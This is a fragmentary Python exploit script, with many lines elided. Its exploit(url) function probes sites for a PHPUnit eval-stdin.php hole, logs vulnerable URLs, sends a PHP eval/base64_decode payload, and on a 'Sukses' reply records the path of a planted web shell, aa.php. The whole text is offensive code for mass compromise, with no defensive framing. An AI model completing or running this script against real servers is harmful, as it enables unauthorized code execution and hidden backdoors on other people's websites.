...
def exploit(url):
        ...
        try:
                ...
                if "phpinfo" in text.text:
                        ...
                        wre.write(url+"\n")
                        wre.close()
                        data2 = "<?php eval('?>'.base64_decode('')); ?>"
                        ...
                        if "Sukses" in spawn.text:
                                ...
                                pathshell = url.replace("eval-stdin.php","aa.php")
                                wrs.write(pathshell+"\n")
                                wrs.close()
                        else:
                                screenlock.acquire()
